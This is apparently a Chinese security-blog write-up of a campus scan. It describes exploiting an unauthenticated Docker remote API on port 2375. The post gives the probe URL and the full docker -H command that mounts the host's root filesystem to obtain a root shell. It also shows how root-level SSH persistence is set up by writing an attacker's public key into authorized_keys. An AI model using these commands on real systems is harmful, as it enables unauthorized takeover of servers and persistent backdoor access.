#  某校大数据管理后台Docker API未授权漏洞   
原创 大荒Sec  太乙Sec实验室   2025-06-01 05:58  
  
**免责声明****：**  
本公众号 **太乙Sec实验室**  
所提供的实验环境均是本地搭建，仅限于**网络安全研究与学习**  
。旨在为安全爱好者提供技术交流。任何个人或组织因传播、利用本公众号所提供的信息而进行的操作，所导致的直接或间接后果及损失，均由使用者本人负责。**太乙Sec实验室**  
及作者对此不承担任何责任  
  
  
实验背景  
  
翻了一下大一的笔记，记一次在校园的漏扫，某大数据管理后台Docker API未授权漏洞（  
内网映射对外开放）  
  
在  
docker  
上配置了远程访问  
docker  
  
节点上会开放一个  
TCP  
端口  
2375  
，绑定在  
0.0.0.0  
上，如果没有做限制的话，攻击者就可以通过  
Docker  
未授权来控制服务器  
。  
  
（注：本实验应在获得明确授权的教学网络环境中开展，严禁在生产环境进行类似操作）  
  
信息收集  
  
fscan一把梭，发现**172.16.55.3 code=200****，怀疑目标存在漏洞****,so****更一步进行资产收集****,****发现漏洞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tHlQeib8sz1JrrIOaELWYObYOlnJ3WLTyiawoib5kuNKD5zTTLWI0XKTaIzVIpUIibXx6ZqkKUeltBcEcEsUpuymog/640?wx_fmt=png&from=appmsg "")  
  
GOBY一把梭  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tHlQeib8sz1JrrIOaELWYObYOlnJ3WLTyJv8Z5KCEiasS18Wcd3gkamgDSHQOVmOibMr0VQnxh04ZCV6ZwFHj9BJQ/640?wx_fmt=jpeg&from=appmsg "")  
  
漏洞验证  
  
  
http://172.16.55.3:2375/info  
  
![图形用户界面, 文本, 电子邮件

描述已自动生成](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tHlQeib8sz1JrrIOaELWYObYOlnJ3WLTydUx4fcGVZfAB95RhfNc4kSzVhVRNwTqCC3kbDbJETia2JqnjIlwvdPg/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/tHlQeib8sz1JrrIOaELWYObYOlnJ3WLTyLzFfgKeFfbO0v13ibWsFATvicDichibMgIlJG1EbcJ0ohtbQd6CXMB0P1Q/640?wx_fmt=png&from=appmsg "")  
  
在这里拉取一个镜像文件  
busybox  
（  
id  
）  
  
![图形用户界面, 文本

描述已自动生成](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tHlQeib8sz1JrrIOaELWYObYOlnJ3WLTyd2IZG13kDKtYniawqbvmtVBycoqojrJLibic5LIk8vHEamiawa2ohDyOtw/640?wx_fmt=jpeg&from=appmsg "")  
  
```
docker  -H tcp://172.16.55.3:2375 run -it -v /:/mnt  19485c79a9bb   /bin/bash 
```  
  
这条命令的意思是启动一个  
image ID  
  
为  
19485c79a9bb  
的容器，并且将该宿主机的根目录挂在到容器的  
/mnt  
目录下  
,  
最后启动之后就会获得该容器宿主机的  
shell   
```
Whoami发现是root 
直接cd mnt/root/
```  
  
![图形用户界面, 文本

描述已自动生成](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tHlQeib8sz1JrrIOaELWYObYOlnJ3WLTyGHxFuCGAI77kAfejuYcV3zYV3f9TRb1aFJXPDa4uLD0Picib8gwybr1w/640?wx_fmt=jpeg&from=appmsg "")  
  
看到到服务器上的  
root  
下的文件。在  
kali  
生成：  
ssh-keygen -t rsa 看下生成的文件  
  
![图形用户界面

中度可信度描述已自动生成](https://mmbiz.qpic.cn/sz_mmbiz_jpg/tHlQeib8sz1JrrIOaELWYObYOlnJ3WLTyiaCJX9TxLibGTKIZsnDpkJzKWDmHicrNopdLIP6dpS0xJWfnRlN0d3DiaA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
id_rsa  
id_rsa.pub再回到远程主机上来使用  
echo  
指令将公钥写进去  
,  
达到远程免密  
ssh  
连接。  
```
ssh -i id_rsa root@ip
```  
  
总结  
  
本次攻击围绕校园大数据管理后台 Docker API 未授权漏洞展开，我将按照操作步骤梳理出完整的攻击链路：  
1. **信息收集**  
：使用 fscan 工具扫描发现目标 IP 172.16.55.3 响应 code=200，存在漏洞可疑性，后借助 GOBY 工具进一步确认资产信息，锁定漏洞。  
  
1. **漏洞验证**  
：访问http://172.16.55.3:2375/info，验证 Docker API 未授权访问漏洞存在。  
  
1. **权限获取**  
：拉取 busybox 镜像，执行docker -H tcp://172.16.55.3:2375 run -it -v /:/mnt 19485c79a9bb /bin/bash  
命令，将宿主机根目录挂载到容器 /mnt 目录，获取容器宿主机的 root 权限 Shell。  
  
1. **持久化控制**  
：在 Kali 系统中通过ssh-keygen -t rsa  
生成 SSH 密钥对，将公钥写入目标主机~/.ssh/authorized_keys  
文件，实现使用私钥ssh -i id_rsa root@ip  
远程免密登录控制 。  
  
往期精彩回顾  
  
[记一次某校情平台水平越权，导致全校学生信息泄露](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc2MDQyMg==&mid=2247486513&idx=1&sn=fffe6f1b497c681987750137b266e65f&scene=21#wechat_redirect)  
  
  
[深度修复 DeepSeek 云端部署潜在威胁漏洞](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc2MDQyMg==&mid=2247486497&idx=1&sn=b6699a63779636dfdbb736ce74f9ef07&scene=21#wechat_redirect)  
  
  
**关注我****，了解****更多知识，别忘****了关注****+点赞****哦！******  
  
![](https://mmbiz.qpic.cn/mmbiz_png/RITPxDQz30icticGDszvMCTbvDxbl8zxyibqkfOTIRXJQVU3YEHicR6AiatHvlnPic7qayibiazKoJV54NVDMmL1uVqsGg/640?wx_fmt=other&random=0.008279855111830159&random=0.8417589579850686&random=0.7406363082812077&random=0.10974797073162001&random=0.07292006660739969&wxfrom=5&wx_lazy=1&wx_co=1&random=0.9329563926201925&random=0.7721899576088909&random=0.8732144113576208&random=0.19158149965875793&random=0.14234663701611816&random=0.6197239709294833&random=0.6087404282162256&random=0.7816651464380318&random=0.6382235312520264&random=0.18529992036868959&random=0.8108904783265143&random=0.8471140121001628&random=0.08898610680286101&random=0.008507273801011683&random=0.9647940082061903&random=0.49839411124559185&random=0.36416103289090485&random=0.8610727679390984&random=0.4202445756317146&random=0.5658152415600335&random=0.05215623887101817&random=0.054673954102818945&random=0.7636185446317116&random=0.6630448098148167&random=0.6555189201793772&tp=webp "")  
  
  
